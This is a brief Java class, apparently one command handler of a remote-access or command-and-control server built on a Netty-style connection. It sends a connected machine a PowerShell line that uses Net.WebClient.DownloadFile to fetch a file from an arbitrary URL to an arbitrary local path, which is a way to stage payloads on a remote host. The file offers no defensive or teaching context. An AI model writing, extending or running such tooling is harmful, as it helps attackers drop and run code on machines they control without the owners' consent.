package netty.server.commands;

import netty.server.Connection;

import java.io.UnsupportedEncodingException;

public class UploadPowershell {
    public static void run(String arg1, String arg2, Connection connection) throws UnsupportedEncodingException, InterruptedException {
        connection.send("(New-Object Net.WebClient).DownloadFile('"+arg1+"', '"+arg2+"')" + "\n");
    }
}
